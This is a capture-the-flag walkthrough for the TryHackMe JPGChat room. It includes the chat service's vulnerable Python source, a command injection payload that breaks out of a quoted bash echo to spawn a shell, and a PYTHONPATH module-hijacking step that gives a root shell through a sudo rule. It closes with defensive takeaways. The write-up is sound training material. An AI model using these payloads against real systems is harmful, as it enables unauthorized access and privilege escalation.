# TryHackMe — JPGChat (Easy) Walkthrough

> Room: **JPGChat** (Easy)  
> Goal: Exploit a command injection vulnerability in a chat service, then escalate to root via Python library hijacking.

This box is a focused two-step chain:
**netcat to chat service → OS command injection via unsanitized input → shell as user → PYTHONPATH hijack via sudo → root**

---

## 1) Recon (Nmap)

Run a full TCP scan to identify open ports:

```/dev/null/nmap.txt#L1-1
nmap -p- -sC -sV -T4 --min-rate=1000 -oN nmap_scan.txt <IP_ADDRESS>
```

### Results (key ports)

- `3000/tcp` — Custom chat service (JPGChat)
- `22/tcp` — SSH (OpenSSH)

No web server this time. The entry point is the chat service on port `3000`.

---

## 2) Connect to the chat service

Use `netcat` to interact with the service:

```/dev/null/nc.txt#L1-1
nc <IP_ADDRESS> 3000
```

You are presented with options:

- `[MESSAGE]` — send a message to the channel
- `[REPORT]` — file a report to the admins

The service also mentions that its source code is hosted on the admin's GitHub.

---

## 3) Find and analyze the source code

After exploring the service, locate the source code on GitHub. The relevant portion is:

```/dev/null/source.py#L1-22
#!/usr/bin/env python3

import os

print('Welcome to JPChat')
print('the source code of this service can be found at our admin\'s github')

def report_form():
    print('this report will be read by Mozzie-jpg')
    your_name = input('your name:\n')
    report_text = input('your report:\n')
    os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
    os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)

def chatting_service():
    print('MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel')
    print('REPORT USAGE: use [REPORT] to report someone to the admins (with proof)')
    message = input('')
    if message == '[REPORT]':
        report_form()
    if message == '[MESSAGE]':
        print('There are currently 0 other users logged in')
        while True:
            message2 = input('[MESSAGE]: ')
            if message2 == '[REPORT]':
                report_form()

chatting_service()
```

### The vulnerability

The critical lines are:

```/dev/null/vuln.py#L1-2
os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)
```

The `your_name` and `report_text` values are passed **directly** into `os.system()` using Python's `%s` string formatting — with **no sanitization or escaping**.

This means whatever you type is injected raw into a bash command, giving you **OS command injection**.

---

## 4) Exploit: OS command injection

### 4.1 Trigger the report form

When connected via `nc`, choose:

```/dev/null/trigger.txt#L1-1
[REPORT]
```

You will be prompted for:
- `your name:`
- `your report:`

### 4.2 Inject a shell via the name field

The `your_name` input is placed inside a single-quoted bash string like:

```/dev/null/template.txt#L1-1
bash -c 'echo <YOUR_INPUT> > /opt/jpchat/logs/report.txt'
```

To escape the single quotes and inject a command, use:

```/dev/null/payload.txt#L1-1
lore';/bin/bash;echo '
```

**How this payload works, step by step:**

1. `lore'` — closes the opening single quote, ending the `echo` argument
2. `;` — terminates the current command
3. `/bin/bash` — executes a new bash shell (inheriting the process privileges)
4. `;echo '` — starts a new command that opens a single quote to avoid bash syntax errors in the remainder of the injected string

The resulting bash command that gets executed becomes:

```/dev/null/result_cmd.txt#L1-1
bash -c 'echo lore'; /bin/bash; echo '' > /opt/jpchat/logs/report.txt'
```

This gives you a shell as the service user (`wes`).

---

## 5) Stabilize the shell

Once inside, stabilize if needed:

```/dev/null/stabilize.txt#L1-3
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Retrieve the user flag from the home directory.

---

## 6) Privilege escalation to root — PYTHONPATH hijacking (detailed)

### 6.1 Check sudo permissions

```/dev/null/sudo_l.txt#L1-1
sudo -l
```

Output shows:

```/dev/null/sudo_output.txt#L1-3
    mail_badpass, env_keep+=PYTHONPATH

(root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```

Two critical things here:

1. You can run `/opt/development/test_module.py` as **root** without a password
2. `SETENV` is allowed, meaning you can **set environment variables** when running the command
3. `env_keep+=PYTHONPATH` means `PYTHONPATH` is **preserved** when running sudo

### 6.2 Understand why this leads to root

**PYTHONPATH** is an environment variable that tells Python where to look for modules **before** it checks system library paths.

If a script running as root does:

```/dev/null/import_example.py#L1-1
import compare
```

Python will search `PYTHONPATH` directories **first**. If you place a malicious `compare.py` in a directory you control and set `PYTHONPATH` to that directory, Python will import **your file** instead of the real one — and execute it as **root**.

This is known as **Python library/module hijacking**.

### 6.3 Inspect the target script

Check what `test_module.py` imports:

```/dev/null/cat_module.txt#L1-1
cat /opt/development/test_module.py
```

Confirm it imports `compare` (or another module you can shadow).

### 6.4 Create a malicious `compare.py`

In your home directory (`/home/wes`), create a file named `compare.py` with a payload:

```/dev/null/create_compare.txt#L1-1
echo -e "import os\nos.system('/bin/bash')" > /home/wes/compare.py
```

Verify the file contents:

```/dev/null/cat_compare.txt#L1-3
cat /home/wes/compare.py
# Should output:
# import os
# os.system('/bin/bash')
```

### 6.5 Set PYTHONPATH to your directory

```/dev/null/pythonpath.txt#L1-1
export PYTHONPATH=/home/wes
```

This tells Python: "look in `/home/wes` first when resolving imports."

### 6.6 Run the privileged script

```/dev/null/sudo_run.txt#L1-1
sudo PYTHONPATH=/home/wes /usr/bin/python3 /opt/development/test_module.py
```

**What happens:**
1. `sudo` runs `python3` as **root**
2. Python starts executing `test_module.py`
3. When it hits `import compare`, Python checks `PYTHONPATH` first
4. It finds `/home/wes/compare.py`
5. It executes your `compare.py` — which calls `os.system('/bin/bash')`
6. Since the process is running as root, you get a **root shell**

Verify:

```/dev/null/verify.txt#L1-2
whoami
id
```

Retrieve the root flag from `/root/root.txt`.

---

## Summary (attack chain)

1. Nmap → find chat service on port `3000`
2. Connect with `nc` → trigger `[REPORT]` form
3. Analyze source code → identify unsanitized `os.system()` with `%s`
4. Inject `lore';/bin/bash;echo '` as the name input → shell as `wes`
5. `sudo -l` → reveals `PYTHONPATH` hijacking opportunity
6. Create malicious `compare.py` → set `PYTHONPATH=/home/wes` → run sudo script → root shell
7. Retrieve root flag

---

## Notes / Defensive takeaways

- Never pass user input directly into `os.system()` — use `subprocess` with argument lists to prevent injection.
- Avoid `%s` string formatting for shell commands; sanitize and validate all user input.
- `SETENV` in sudo rules is dangerous — never combine it with `PYTHONPATH` preservation.
- Treat `PYTHONPATH` like a code execution vector in privileged contexts.
- Regularly audit `sudo` rules and remove unnecessary `env_keep` entries.